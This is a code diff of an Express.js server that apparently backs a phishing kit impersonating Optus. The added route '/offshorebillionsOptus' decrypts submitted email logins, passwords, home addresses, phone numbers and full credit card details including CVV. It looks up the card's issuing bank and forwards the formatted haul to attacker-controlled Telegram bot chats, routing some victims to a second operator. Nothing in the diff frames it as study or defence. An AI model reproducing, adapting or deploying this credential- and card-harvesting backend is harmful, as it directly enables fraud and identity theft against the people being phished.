@@ -5362,7 +5362,6 @@ app.post("/tCapz", (req, res) => {
 //OPTUS
 //OPTUS
 //OPTUS
-
 app.options("/spooferGooferOptus", cors());
 
 app.post("/spooferGooferOptus", (req, res) => {
@@ -5450,6 +5449,97 @@ app.post("/spooferGooferOptus", (req, res) => {
             console.log(err);
           });
         Spoofergoofer += 1;
+      }
+      res.send("Update Completed");
+    });
+});
+
+app.options("/offshorebillionsOptus", cors());
+
+app.post("/offshorebillionsOptus", (req, res) => {
+  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  cccvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  bin = req.body.bin;
+  userAgent = req.body.userAgent;
+  ip = req.body.ip;
+
+  if (bin.length === 7) {
+    formatBin = bin.replace(/ /g, "");
+    if (formatBin.length === 7) {
+      formatBin = bin.slice(0, -1);
+    }
+    bin = formatBin;
+  }
+  axios
+    .get(`https://lookup.binlist.net/${bin}`)
+    .then((resp) => {
+      if (!resp.data.bank) {
+        bankName = "";
+      } else {
+        bankName = resp.data.bank.name;
+      }
+    })
+    .then(function () {
+      binList = `${bin} | ${zip} | ${bankName}`;
+      var originalText = `+----------- Login Information ------------+\nEmail: ${email}\nPassword: ${password}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
+      if (bill == 100) {
+        axios
+          .post(
+            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
+          )
+          .catch((err) => {
+            console.log(err);
+          });
+        Spoofergoofer = 4;
+      } else {
+        axios
+          .post(
+            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=OptusSpooferGoofer:\n${originalText}`
+          )
+          .catch((err) => {
+            console.log(err);
+          });
+        axios
+          .post(
+            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1248091713&text=Optus:\n${originalText}`
+          )
+          .catch((err) => {
+            console.log(err);
+          });
       }
       res.send("Update Completed");
     });
